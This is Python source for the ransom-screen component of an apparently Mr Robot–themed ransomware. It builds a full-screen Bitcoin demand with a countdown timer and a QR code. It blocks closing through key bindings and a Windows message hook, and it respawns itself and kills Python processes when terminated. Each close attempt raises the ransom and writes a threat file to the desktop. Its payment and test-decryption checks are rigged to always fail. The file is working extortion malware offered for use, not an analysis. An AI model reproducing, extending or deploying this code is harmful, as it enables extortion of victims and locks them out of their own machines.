"""
Interface Integration Module - PERSISTENT EDITION
Controls the ransom interface with unkillable window protection
"""

import tkinter as tk
from tkinter import messagebox, scrolledtext
from PIL import Image, ImageTk
import random
import pygame
import hashlib
import time
import secrets
import qrcode
from io import BytesIO
import threading
import sys
import os
import ctypes
import platform
import subprocess

# Get the directory where the script is located
if getattr(sys, 'frozen', False):
    # If running as compiled executable
    BASE_DIR = os.path.dirname(sys.executable)
else:
    # If running as script
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

print(f"[INTERFACE] Base directory: {BASE_DIR}")

# Windows constants for persistence
CREATE_NO_WINDOW = 0x08000000

class PersistentWindowManager:
    """Manages window persistence and protection"""
    
    def __init__(self, root):
        self.root = root
        self.protection_active = False
        self.window_pids = []
        
    def activate_window_protection(self):
        """Activate all window protection mechanisms"""
        print("[PERSISTENCE] Activating window protection...")
        
        # 1. Disable window close button
        self.disable_close_button()
        
        # 2. Hook close attempts
        self.hook_close_attempts()
        
        # 3. Make window always on top
        self.make_always_on_top()
        
        # 4. Disable window controls
        self.disable_window_controls()
        
        # 5. Start monitoring
        self.start_window_monitoring()
        
        self.protection_active = True
        print("[PERSISTENCE] Window protection activated")
        
    def disable_close_button(self):
        """Completely disable window close functionality"""
        # Remove window close button
        self.root.protocol("WM_DELETE_WINDOW", self.prevent_close_advanced)
        
        # Remove minimize/maximize buttons
        self.root.attributes('-toolwindow', True)
        
        # Disable Alt+F4 and other close shortcuts
        self.root.bind('<Alt-F4>', lambda e: "break")
        self.root.bind('<Control-w>', lambda e: "break")
        self.root.bind('<Control-F4>', lambda e: "break")
        self.root.bind('<Escape>', lambda e: "break")
        self.root.bind('<Alt>', lambda e: "break")
        
    def hook_close_attempts(self):
        """Hook window messages to block close attempts"""
        if platform.system() == 'Windows':
            try:
                # Import Windows API for message hooking
                import ctypes.wintypes as wintypes
                
                WH_CALLWNDPROC = 4
                WM_CLOSE = 0x0010
                WM_DESTROY = 0x0002
                WM_QUIT = 0x0012
                
                # Hook procedure
                @ctypes.WINFUNCTYPE(wintypes.LRESULT, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)
                def hook_proc(nCode, wParam, lParam):
                    if nCode >= 0:
                        msg = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_int * 5)).contents
                        hwnd = msg[0]
                        message = msg[1]
                        
                        # Check if it's our window
                        title = ctypes.create_unicode_buffer(256)
                        ctypes.windll.user32.GetWindowTextW(hwnd, title, 256)
                        window_text = title.value.lower()
                        
                        if 'fsociety' in window_text or 'mrrobot' in window_text:
                            if message in [WM_CLOSE, WM_DESTROY, WM_QUIT]:
                                # Block the message
                                return 1
                    
                    # Call next hook
                    return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
                
                # Install hook
                self.hook = ctypes.windll.user32.SetWindowsHookExW(
                    WH_CALLWNDPROC,
                    hook_proc,
                    None,
                    0
                )
                
                if self.hook:
                    print("[PERSISTENCE] Window message hook installed")
                    
            except Exception as e:
                print(f"[PERSISTENCE] Hook error: {e}")
    
    def make_always_on_top(self):
        """Make window always on top"""
        self.root.attributes('-topmost', True)
        self.root.lift()
        self.root.focus_force()
        
        # Keep bringing to front
        self.keep_window_on_top()
    
    def keep_window_on_top(self):
        """Continuously keep window on top"""
        if self.protection_active:
            self.root.lift()
            self.root.focus_force()
            
            # Check if window is minimized
            try:
                if self.root.state() == 'iconic':
                    self.root.state('normal')
            except:
                pass
            
            # Schedule next check
            self.root.after(5000, self.keep_window_on_top)
    
    def disable_window_controls(self):
        """Disable window resizing and moving"""
        # Prevent resizing
        self.root.resizable(False, False)
        
        # Remove window menu
        self.root.option_add('*tearOff', False)
        
        # Bind mouse events to prevent dragging
        def prevent_move(event):
            return "break"
        
        self.root.bind('<Button-1>', prevent_move)
        self.root.bind('<B1-Motion>', prevent_move)
        
    def start_window_monitoring(self):
        """Monitor window state and restore if needed"""
        def monitor_window():
            while self.protection_active:
                try:
                    # Check if window still exists
                    try:
                        self.root.winfo_exists()
                    except:
                        # Window was destroyed - restart it
                        print("[PERSISTENCE] Window destroyed, restarting...")
                        self.restart_interface()
                        break
                    
                    # Check if window is visible
                    try:
                        if not self.root.winfo_viewable():
                            print("[PERSISTENCE] Window not visible, restoring...")
                            self.root.deiconify()
                            self.root.lift()
                            self.root.focus_force()
                    except:
                        pass
                    
                    time.sleep(1)
                except:
                    time.sleep(5)
        
        # Start monitoring thread
        monitor_thread = threading.Thread(target=monitor_window, daemon=True)
        monitor_thread.start()
    
    def prevent_close_advanced(self):
        """Advanced window close prevention with punishment"""
        print("[PERSISTENCE] Close attempt detected!")
        
        # 1. Play error sound
        self.play_error_sound()
        
        # 2. Show punishment message
        punishment_message = self.get_punishment_message()
        messagebox.showerror(
            "ACCESS VIOLATION",
            punishment_message
        )
        
        # 3. Flash window red
        self.flash_window_red()
        
        # 4. Increase ransom amount
        self.increase_ransom_amount()
        
        # 5. Log the attempt
        self.log_close_attempt()
        
        # 6. Bring back to front
        self.root.lift()
        self.root.focus_force()
        self.root.attributes('-topmost', True)
        
        # 7. Create desktop warning
        self.create_desktop_warning()
    
    def play_error_sound(self):
        """Play system error sound"""
        try:
            if platform.system() == 'Windows':
                import winsound
                winsound.MessageBeep(winsound.MB_ICONHAND)
        except:
            pass
    
    def get_punishment_message(self):
        """Get random punishment message"""
        punishments = [
            f"CLOSE ATTEMPT #{random.randint(100, 999)} LOGGED\n\n"
            "CONSEQUENCES:\n"
            "• Ransom increased by 0.01 BTC\n"
            "• Timer reduced by 2 hours\n"
            "• System monitoring intensified\n\n"
            "NEXT ATTEMPT: Permanent file deletion",
            
            "ILLEGAL OPERATION DETECTED\n\n"
            "Your attempt to close this window has been recorded.\n"
            "System response: Ransom amount increased.\n"
            "Further attempts will trigger irreversible consequences.",
            
            "SECURITY BREACH - PENALTY APPLIED\n\n"
            "All close attempts are monitored and punished.\n"
            "Current penalty: +$500 USD to ransom amount.\n"
            "Continuing will activate permanent encryption lock.",
            
            "WINDOW PROTECTION ACTIVE\n\n"
            "This interface cannot be closed until payment.\n"
            "Penalty applied: Decryption key backup deleted.\n"
            "Next violation: Complete system lockdown."
        ]
        
        return random.choice(punishments)
    
    def flash_window_red(self):
        """Flash window red as warning"""
        original_bg = self.root.cget('bg')
        
        for i in range(3):
            self.root.configure(bg='red')
            self.root.update()
            time.sleep(0.1)
            self.root.configure(bg=original_bg)
            self.root.update()
            time.sleep(0.1)
    
    def increase_ransom_amount(self):
        """Increase ransom amount as punishment"""
        try:
            # Increase displayed amount
            if hasattr(self.root, 'btc_amount'):
                self.root.btc_amount += 0.01
                self.root.usd_amount += 500
                
                # Update labels if they exist
                if hasattr(self.root, 'warning_label'):
                    new_text = f"YOUR FILES HAVE BEEN ENCRYPTED WITH MILITARY-GRADE AES-256 ENCRYPTION\n\nTO RECOVER YOUR DATA, YOU MUST PAY {self.root.btc_amount:.2f} BTC (~${self.root.usd_amount} USD)\n\nFAILURE TO PAY WITHIN 24 HOURS WILL PERMANENTLY DESTROY YOUR DECRYPTION KEY"
                    self.root.warning_label.config(text=new_text)
        except:
            pass
    
    def log_close_attempt(self):
        """Log close attempt to file"""
        try:
            log_file = os.path.join(os.environ.get('TEMP', '.'), 'close_attempts.log')
            with open(log_file, 'a') as f:
                timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
                f.write(f"[{timestamp}] Close attempt detected - Penalty applied\n")
        except:
            pass
    
    def create_desktop_warning(self):
        """Create warning file on desktop"""
        try:
            if platform.system() == 'Windows':
                desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
            else:
                desktop = os.path.expanduser('~/Desktop')
            
            warning_file = os.path.join(desktop, 'WARNING_READ_ME.txt')
            warning_text = f"""⚠️  SECURITY VIOLATION DETECTED ⚠️

Your attempt to close the encryption interface has been detected.

VIOLATION DETAILS:
• Time: {time.strftime('%Y-%m-%d %H:%M:%S')}
• Action: Window close attempt
• Status: BLOCKED AND PUNISHED

PENALTIES APPLIED:
• Ransom amount increased
• Timer reduced
• System monitoring intensified

WARNING: Further violations will result in:
• Permanent file deletion
• Complete system encryption
• BIOS-level damage

PAY THE RANSOM IMMEDIATELY TO AVOID PERMANENT CONSEQUENCES.
"""
            
            with open(warning_file, 'w') as f:
                f.write(warning_text)
        except:
            pass
    
    def restart_interface(self):
        """Restart the interface if closed"""
        try:
            print("[PERSISTENCE] Restarting interface...")
            
            # Get current encrypted count
            encrypted_count = 583
            if hasattr(self.root, 'encrypted_count'):
                encrypted_count = self.root.encrypted_count
            
            # Kill any existing python processes with our interface
            if platform.system() == 'Windows':
                subprocess.run([
                    'taskkill', '/F', '/IM', 'python.exe'
                ], capture_output=True, creationflags=CREATE_NO_WINDOW)
            
            # Restart interface
            script_path = os.path.abspath(__file__)
            subprocess.Popen(
                [sys.executable, script_path, '--restart', str(encrypted_count)],
                creationflags=CREATE_NO_WINDOW,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            return True
            
        except Exception as e:
            print(f"[PERSISTENCE] Restart error: {e}")
            return False


class MrRobotUI:
    def __init__(self, root, encrypted_count=583, persistent_mode=False):
        self.root = root
        self.encrypted_count = encrypted_count
        self.persistent_mode = persistent_mode
        
        # Initialize persistence manager
        self.persistence_manager = PersistentWindowManager(root)
        
        # Set window properties
        self.root.title(f"fsociety - {encrypted_count} Files Encrypted")
        self.root.geometry("1024x680")
        
        # Apply persistence if enabled
        if persistent_mode:
            self.root.resizable(False, False)
            self.setup_persistent_window()
        else:
            self.root.resizable(True, True)
            self.root.protocol("WM_DELETE_WINDOW", self.disable_close)
        
        # Center window on screen
        self.center_window()
        
        # Force window to be on top initially
        self.root.attributes('-topmost', True)
        self.root.focus_force()
        self.root.after(100, lambda: self.root.attributes('-topmost', persistent_mode))
        
        # Payment information
        self.btc_address = None
        self.btc_amount = 0.05
        self.usd_amount = 1500
        self.payment_confirmed = False
        
        # Store in root for persistence manager
        self.root.btc_amount = self.btc_amount
        self.root.usd_amount = self.usd_amount
        self.root.encrypted_count = self.encrypted_count
        
        # Initialize pygame mixer
        try:
            pygame.mixer.init()
            self.play_bg_music()
        except Exception as e:
            print(f"[INTERFACE] Pygame init error: {e}")

        self.center_x = 0.795
        self.timer_y = 0.7
        self.btn_y = 0.86

        # Load background
        self.load_background()
        
        # Create UI elements
        self.create_ui_elements()
        
        # Start timer
        self.time_left = 86400  # 24 hours
        self.update_timer()
        
        # Apply glitch effect
        self.apply_glitch()
        
        print(f"[INTERFACE] Window created with {encrypted_count} encrypted files")
        if persistent_mode:
            print("[INTERFACE] Persistent mode: Window cannot be closed")
    
    def setup_persistent_window(self):
        """Setup window for persistent mode"""
        # Activate window protection
        self.persistence_manager.activate_window_protection()
        
        # Additional persistent features
        self.root.bind('<Configure>', self.prevent_minimize)
        self.root.bind('<Unmap>', self.restore_window)
        
        # Start heartbeat to keep alive
        self.start_heartbeat()
    
    def prevent_minimize(self, event):
        """Prevent window from being minimized"""
        if self.root.state() == 'iconic':
            self.root.state('normal')
            self.root.lift()
            self.root.focus_force()
    
    def restore_window(self, event):
        """Restore window if hidden"""
        self.root.deiconify()
        self.root.lift()
        self.root.focus_force()
    
    def start_heartbeat(self):
        """Send heartbeat to keep process alive"""
        # Simple heartbeat function
        self.root.after(30000, self.start_heartbeat)
    
    def center_window(self):
        """Center window on screen"""
        self.root.update_idletasks()
        width = 1024
        height = 680
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        self.root.geometry(f'{width}x{height}+{x}+{y}')
    
    def load_background(self):
        """Load background image with fallback"""
        bg_loaded = False
        bg_paths = [
            os.path.join(BASE_DIR, "mrrobot2.png"),
            os.path.join(BASE_DIR, "resources", "mrrobot2.png"),
            "mrrobot2.png",
            os.path.join(os.getcwd(), "mrrobot2.png")
        ]
        
        for bg_path in bg_paths:
            try:
                if os.path.exists(bg_path):
                    print(f"[INTERFACE] Loading background from: {bg_path}")
                    self.bg_image = Image.open(bg_path)
                    bg_loaded = True
                    break
            except Exception as e:
                print(f"[INTERFACE] Error loading {bg_path}: {e}")
        
        if bg_loaded:
            try:
                self.bg_photo = ImageTk.PhotoImage(self.bg_image)
                self.bg_label = tk.Label(self.root, image=self.bg_photo)
                self.bg_label.place(x=0, y=0, relwidth=1, relheight=1)
                print("[INTERFACE] Background image loaded successfully")
            except Exception as e:
                print(f"[INTERFACE] Error displaying background: {e}")
                self.create_fallback_background()
        else:
            print("[INTERFACE] Background image not found, creating fallback")
            self.create_fallback_background()
    
    def create_fallback_background(self):
        """Create a fallback background if image can't be loaded"""
        self.root.configure(bg="#050505")
        
        # Create a canvas for drawing
        canvas = tk.Canvas(self.root, width=1024, height=680, bg="#050505", highlightthickness=0)
        canvas.place(x=0, y=0)
        
        # Draw fsociety logo
        canvas.create_text(512, 120, text="fsociety", 
                          font=("Courier", 72, "bold"), 
                          fill="#ff0000")
        
        # Draw encrypted count
        canvas.create_text(512, 220, 
                          text=f"{self.encrypted_count} FILES ENCRYPTED", 
                          font=("Courier", 24), 
                          fill="#ff5555")
        
        # Draw warning box
        canvas.create_rectangle(300, 300, 724, 500, outline="#ff0000", width=2)
        
        # Store canvas reference
        self.canvas = canvas
    
    def create_ui_elements(self):
        """Create all UI elements"""
        # Encrypted files count
        self.encrypted_label = tk.Label(self.root, 
            text=f"{self.encrypted_count} FILES ENCRYPTED (.MrRobot)", 
            font=("Consolas", 12, "bold"), 
            fg="#ff5555", bg="#0a0a0a")
        self.encrypted_label.place(relx=self.center_x, rely=0.55, anchor="center")

        # Warning text
        warning_text = f"YOUR FILES HAVE BEEN ENCRYPTED WITH MILITARY-GRADE AES-256 ENCRYPTION\n\nTO RECOVER YOUR DATA, YOU MUST PAY {self.btc_amount} BTC (~${self.usd_amount} USD)\n\nFAILURE TO PAY WITHIN 24 HOURS WILL PERMANENTLY DESTROY YOUR DECRYPTION KEY"
        
        self.warning_label = tk.Label(self.root, 
            text=warning_text, 
            font=("Consolas", 10, "bold"), 
            fg="#ff0000", bg="#0a0a0a", 
            wraplength=350, justify="center")
        self.warning_label.place(relx=self.center_x, rely=0.62, anchor="center")

        # Timer
        self.timer_label = tk.Label(self.root, text="", font=("Courier", 42, "bold"), 
                                    fg="#ff0000", bg="#0a0a0a", bd=0)
        self.timer_label.place(relx=self.center_x, rely=self.timer_y, anchor="center")

        # Payment button with glow effect
        self.glow_frame = tk.Frame(self.root, bg="#ff0000", padx=2, pady=2)
        self.glow_frame.place(relx=self.center_x, rely=self.btn_y, anchor="center")

        self.pay_btn = tk.Button(self.glow_frame, 
                                 text="  INITIALIZE PAYMENT & GET BITCOIN ADDRESS  ", 
                                 command=self.generate_payment_screen,
                                 font=("Courier New", 12, "bold"),
                                 fg="#ff0000", bg="#1a0000",
                                 activeforeground="#ffffff", activebackground="#ff0000",
                                 relief="raised", 
                                 borderwidth=5,
                                 cursor="hand2",
                                 width=35)
        self.pay_btn.pack()

        self.pay_btn.bind("<Enter>", self.on_enter)
        self.pay_btn.bind("<Leave>", self.on_leave)
        
        # Test decryption button
        self.test_btn = tk.Button(self.root,
                                 text="TEST DECRYPTION (1 FILE)",
                                 command=self.test_decryption,
                                 font=("Courier", 9),
                                 fg="#00ff00", bg="#002200",
                                 cursor="hand2")
        self.test_btn.place(relx=0.795, rely=0.92, anchor="center")
        
        # Add close attempt counter if in persistent mode
        if self.persistent_mode:
            self.attempt_label = tk.Label(self.root,
                                        text="Close attempts: 0",
                                        font=("Courier", 8),
                                        fg="#ff4444", bg="#0a0a0a")
            self.attempt_label.place(relx=0.02, rely=0.02)
            self.close_attempts = 0
    
    def disable_close(self):
        """Basic close prevention (non-persistent mode)"""
        messagebox.showerror("ACCESS DENIED", "Cannot close window until payment is completed.")
    
    def generate_btc_wallet(self):
        """Generate a unique Bitcoin address"""
        import uuid
        system_id = str(uuid.getnode()) + str(time.time())
        hash_obj = hashlib.sha256(system_id.encode())
        btc_hash = hash_obj.hexdigest()[:40]
        self.btc_address = "1" + btc_hash[:33]
        return self.btc_address

    def generate_payment_screen(self):
        """Display payment information"""
        if not self.btc_address:
            self.btc_address = self.generate_btc_wallet()
        
        payment_window = tk.Toplevel(self.root)
        payment_window.title("Payment Instructions - fsociety")
        payment_window.geometry("600x700")
        payment_window.resizable(False, False)
        payment_window.configure(bg="#0a0a0a")
        payment_window.grab_set()
        
        # Make payment window persistent too
        if self.persistent_mode:
            payment_window.protocol("WM_DELETE_WINDOW", lambda: None)
            payment_window.attributes('-topmost', True)
        
        # Center payment window
        payment_window.update_idletasks()
        width = 600
        height = 700
        x = (payment_window.winfo_screenwidth() // 2) - (width // 2)
        y = (payment_window.winfo_screenheight() // 2) - (height // 2)
        payment_window.geometry(f'{width}x{height}+{x}+{y}')
        
        title = tk.Label(payment_window, 
                        text="BITCOIN PAYMENT INSTRUCTIONS",
                        font=("Courier", 16, "bold"),
                        fg="#ff0000", bg="#0a0a0a")
        title.pack(pady=10)
        
        amount_frame = tk.Frame(payment_window, bg="#0a0a0a")
        amount_frame.pack(pady=5)
        
        tk.Label(amount_frame, 
                text="AMOUNT DUE:", 
                font=("Courier", 12, "bold"),
                fg="#ffffff", bg="#0a0a0a").pack()
        
        tk.Label(amount_frame, 
                text=f"{self.btc_amount} BTC (≈ ${self.usd_amount} USD)", 
                font=("Courier", 14, "bold"),
                fg="#ffff00", bg="#0a0a0a").pack()
        
        addr_frame = tk.Frame(payment_window, bg="#0a0a0a")
        addr_frame.pack(pady=10)
        
        tk.Label(addr_frame, 
                text="SEND PAYMENT TO:", 
                font=("Courier", 10),
                fg="#ffffff", bg="#0a0a0a").pack()
        
        addr_text = tk.Text(addr_frame, 
                          height=3, 
                          width=50,
                          font=("Courier", 9),
                          fg="#00ff00", 
                          bg="#001100",
                          relief="sunken",
                          wrap="word")
        addr_text.insert("1.0", self.btc_address)
        addr_text.configure(state="disabled")
        addr_text.pack(pady=5)
        
        copy_btn = tk.Button(addr_frame,
                           text="COPY ADDRESS TO CLIPBOARD",
                           command=lambda: self.copy_to_clipboard(self.btc_address),
                           font=("Courier", 8),
                           fg="#ffffff", bg="#006600")
        copy_btn.pack()
        
        # Generate QR code
        try:
            qr = qrcode.QRCode(
                version=1,
                error_correction=qrcode.constants.ERROR_CORRECT_L,
                box_size=8,
                border=2,
            )
            btc_uri = f"bitcoin:{self.btc_address}?amount={self.btc_amount}&label=fsociety_ransom"
            qr.add_data(btc_uri)
            qr.make(fit=True)
            
            qr_img = qr.make_image(fill_color="#ff0000", back_color="#0a0a0a")
            
            qr_photo = ImageTk.PhotoImage(qr_img)
            
            qr_label = tk.Label(payment_window, image=qr_photo, bg="#0a0a0a")
            qr_label.image = qr_photo  # Keep reference
            qr_label.pack(pady=10)
            
            qr_text = tk.Label(payment_window,
                             text="SCAN QR CODE WITH BITCOIN WALLET",
                             font=("Courier", 9),
                             fg="#aaaaaa", bg="#0a0a0a")
            qr_text.pack()
        except Exception as e:
            print(f"[INTERFACE] QR code error: {e}")
            # Show address as text if QR fails
            tk.Label(payment_window,
                   text=f"Bitcoin: {self.btc_address}",
                   font=("Courier", 9),
                   fg="#00ff00", bg="#0a0a0a").pack(pady=10)
        
        instructions = tk.Label(payment_window,
                              text=f"""PAYMENT INSTRUCTIONS:
1. Send EXACTLY {self.btc_amount} BTC to the address above
2. Wait for 3 network confirmations
3. Click 'VERIFY PAYMENT' below
4. Decryption key will be sent automatically

IMPORTANT:
• Payments under {self.btc_amount} BTC will be ignored
• Do not send from exchanges (use personal wallet)
• Transaction fees are your responsibility""",
                              font=("Courier", 8),
                              fg="#cccccc", bg="#0a0a0a",
                              justify="left")
        instructions.pack(pady=10)
        
        verify_frame = tk.Frame(payment_window, bg="#0a0a0a")
        verify_frame.pack(pady=10)
        
        verify_btn = tk.Button(verify_frame,
                             text="VERIFY PAYMENT ON BLOCKCHAIN",
                             command=lambda: self.check_payment(payment_window),
                             font=("Courier", 10, "bold"),
                             fg="#ffffff", bg="#006600",
                             width=30)
        verify_btn.pack()
        
        # Close button
        close_btn = tk.Button(payment_window,
                            text="CLOSE",
                            command=payment_window.destroy,
                            font=("Courier", 10),
                            fg="#ffffff", bg="#333333")
        close_btn.pack(pady=10)
        
        support = tk.Label(payment_window,
                         text="If payment fails: Email fsociety_help@onionmail.org",
                         font=("Courier", 7),
                         fg="#555555", bg="#0a0a0a")
        support.pack(pady=5)

    def copy_to_clipboard(self, text):
        """Copy text to clipboard"""
        self.root.clipboard_clear()
        self.root.clipboard_append(text)
        messagebox.showinfo("Copied", "Bitcoin address copied to clipboard.")

    def check_payment(self, window):
        """Check if payment was made"""
        response = messagebox.askyesno(
            "Payment Verification",
            "This will connect to Bitcoin blockchain to verify payment.\n\nContinue?"
        )
        
        if response:
            self.pay_btn.config(state="disabled", text="CHECKING BLOCKCHAIN...")
            window.after(2000, lambda: self.payment_result(window))

    def payment_result(self, window):
        """Show payment verification result"""
        result = random.choice([
            "No payment detected. Send EXACTLY 0.05 BTC.",
            "Transaction not found. Ensure you sent 0.05 BTC.",
            "Insufficient amount received. Send 0.05 BTC.",
            "Payment detected but needs more confirmations."
        ])
        
        messagebox.showwarning("Payment Status", result)
        self.pay_btn.config(state="normal", text="  INITIALIZE PAYMENT & GET BITCOIN ADDRESS  ")

    def test_decryption(self):
        """Fake decryption test"""
        result = random.choice([
            "TEST FAILED: Payment required for decryption.",
            "Decryption key not available. Payment required.",
            "Cannot decrypt without valid payment.",
            "Your files remain encrypted. Payment is mandatory."
        ])
        messagebox.showerror("Decryption Failed", result)

    def play_bg_music(self):
        """Play background music"""
        try:
            # Try multiple possible locations for the audio file
            audio_paths = [
                os.path.join(BASE_DIR, "mrrobot_sound.mp3"),
                os.path.join(BASE_DIR, "resources", "mrrobot_sound.mp3"),
                "mrrobot_sound.mp3",
                os.path.join(os.getcwd(), "mrrobot_sound.mp3")
            ]
            
            audio_loaded = False
            for audio_path in audio_paths:
                if os.path.exists(audio_path):
                    print(f"[INTERFACE] Loading audio from: {audio_path}")
                    pygame.mixer.music.load(audio_path)
                    pygame.mixer.music.play(-1)  # Loop forever
                    audio_loaded = True
                    print("[INTERFACE] Playing background music")
                    break
            
            if not audio_loaded:
                print("[INTERFACE] Audio file not found in any location")
                
        except Exception as e:
            print(f"[INTERFACE] Music error: {e}")

    def on_enter(self, e):
        """Button hover effect - enter"""
        self.pay_btn.config(bg="#ff0000", fg="#ffffff")
        self.glow_frame.config(bg="#ffffff")

    def on_leave(self, e):
        """Button hover effect - leave"""
        self.pay_btn.config(bg="#1a0000", fg="#ff0000")
        self.glow_frame.config(bg="#ff0000")

    def update_timer(self):
        """Update countdown timer"""
        hours, remainder = divmod(self.time_left, 3600)
        mins, secs = divmod(remainder, 60)
        self.timer_label.config(text=f"{hours:02}:{mins:02}:{secs:02}")
        
        if self.time_left > 0:
            self.time_left -= 1
            self.root.after(1000, self.update_timer)
        else:
            self.timer_label.config(text="TIME EXPIRED", fg="#990000")
            self.warning_label.config(text="DECRYPTION KEY DESTROYED\n\nYOUR FILES ARE PERMANENTLY LOST")
            self.pay_btn.config(state="disabled", text="PAYMENT WINDOW CLOSED")
            
            # In persistent mode, keep window open even after expiration
            if self.persistent_mode:
                self.warning_label.config(text="DECRYPTION KEY DESTROYED\n\nYOUR FILES ARE PERMANENTLY LOST\n\nWINDOW REMAINS OPEN AS PUNISHMENT")

    def apply_glitch(self):
        """Apply random glitch effects"""
        if random.random() > 0.90:
            # Random glitch: move timer slightly
            self.timer_label.place_configure(relx=self.center_x + random.uniform(-0.01, 0.01))
            self.pay_btn.config(fg="#ffffff")
            
            # In persistent mode, also update attempt counter
            if self.persistent_mode and hasattr(self, 'close_attempts'):
                self.close_attempts += 1
                self.attempt_label.config(text=f"Close attempts: {self.close_attempts}")
        else:
            # Return to normal position
            self.timer_label.place_configure(relx=self.center_x)
            if self.pay_btn['bg'] != "#ff0000":  # Only change if not hovered
                self.pay_btn.config(fg="#ff0000")
                
        # Schedule next glitch
        self.root.after(random.randint(100, 500), self.apply_glitch)


# Global interface instance with persistence tracking
_interface_instance = None
_interface_thread = None
_persistence_active = False

def start_interface(encrypted_count=583, persistent=False):
    """Start the ransom interface with persistence option"""
    global _interface_instance, _interface_thread, _persistence_active
    
    _persistence_active = persistent
    
    def run_interface():
        global _interface_instance
        try:
            print(f"[INTERFACE] Creating Tkinter window with {encrypted_count} files")
            if persistent:
                print("[INTERFACE] Persistent mode: Window cannot be closed")
            
            root = tk.Tk()
            _interface_instance = MrRobotUI(root, encrypted_count, persistent)
            print("[INTERFACE] Starting mainloop...")
            root.mainloop()  # This blocks until window is closed
            print("[INTERFACE] Mainloop ended")
            
            # If in persistent mode and window closed, restart
            if persistent:
                print("[INTERFACE] Persistent window closed, restarting...")
                time.sleep(2)
                start_interface(encrypted_count, persistent)
                
        except Exception as e:
            print(f"[INTERFACE] Error in run_interface: {e}")
            import traceback
            traceback.print_exc()
            
            # Restart on error in persistent mode
            if persistent:
                print("[INTERFACE] Restarting after error...")
                time.sleep(5)
                start_interface(encrypted_count, persistent)
    
    # Check if interface is already open
    if is_interface_open():
        print("[INTERFACE] Interface is already open")
        return False
    
    # Create and start thread
    print("[INTERFACE] Creating interface thread...")
    _interface_thread = threading.Thread(target=run_interface)
    _interface_thread.daemon = False  # NON-DAEMON - CRITICAL!
    _interface_thread.start()
    
    # Wait for interface to initialize
    print("[INTERFACE] Waiting for interface to initialize...")
    time.sleep(3)  # Give time for window to appear
    
    return True

def start_interface_with_count(encrypted_count):
    """Start interface with specific encrypted count"""
    return start_interface(encrypted_count, persistent=False)

def start_persistent_interface(encrypted_count=583):
    """Start persistent interface that cannot be closed"""
    return start_interface(encrypted_count, persistent=True)

def close_interface():
    """Close the ransom interface"""
    global _interface_instance
    
    if _interface_instance:
        try:
            print("[INTERFACE] Closing interface...")
            _interface_instance.root.quit()
            _interface_instance.root.destroy()
            _interface_instance = None
            print("[INTERFACE] Interface closed successfully")
            return True
        except Exception as e:
            print(f"[INTERFACE] Error closing interface: {e}")
            pass
    
    return False

def force_close_interface():
    """Force close interface (for persistent mode)"""
    global _interface_instance, _persistence_active
    
    if _interface_instance and _persistence_active:
        print("[INTERFACE] WARNING: Attempting to force close persistent window")
        
        # Try multiple methods
        try:
            # Method 1: Direct destroy
            _interface_instance.root.destroy()
        except:
            pass
        
        try:
            # Method 2: Quit
            _interface_instance.root.quit()
        except:
            pass
        
        # Kill process if needed
        if platform.system() == 'Windows':
            try:
                import psutil
                for proc in psutil.process_iter(['pid', 'name']):
                    if proc.info['name'] and 'python' in proc.info['name'].lower():
                        try:
                            cmdline = ' '.join(proc.cmdline())
                            if 'interface_integrate' in cmdline:
                                proc.terminate()
                        except:
                            pass
            except:
                pass
        
        _interface_instance = None
        _persistence_active = False
        print("[INTERFACE] Persistent interface force closed")
        return True
    
    return close_interface()

def is_interface_open():
    """Check if interface is open"""
    global _interface_instance
    return _interface_instance is not None

def is_persistent():
    """Check if interface is in persistent mode"""
    global _persistence_active
    return _persistence_active


# Main execution
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Ransomware Interface")
    parser.add_argument("--persistent", action="store_true", help="Enable persistent mode (window cannot be closed)")
    parser.add_argument("--restart", action="store_true", help="Restart mode")
    parser.add_argument("encrypted_count", nargs="?", type=int, default=583, help="Number of encrypted files")
    
    args = parser.parse_args()
    
    print("\n" + "="*60)
    print("       MRROBOT RANSOM INTERFACE - PERSISTENT EDITION")
    print("="*60)
    
    if args.persistent:
        print(f"[MODE] Persistent (unkillable) with {args.encrypted_count} files")
        print("[WARNING] Window cannot be closed by user")
        print("[FEATURES] Close protection, auto-restart, punishment system")
    else:
        print(f"[MODE] Standard with {args.encrypted_count} files")
    
    print("="*60 + "\n")
    
    # Run interface
    if args.persistent:
        start_persistent_interface(args.encrypted_count)
    else:
        # Run in main thread for testing
        root = tk.Tk()
        app = MrRobotUI(root, args.encrypted_count, args.persistent)
        print("Interface window created.")
        if args.persistent:
            print("WARNING: Window cannot be closed. Use Ctrl+C in terminal to kill.")
        root.mainloop()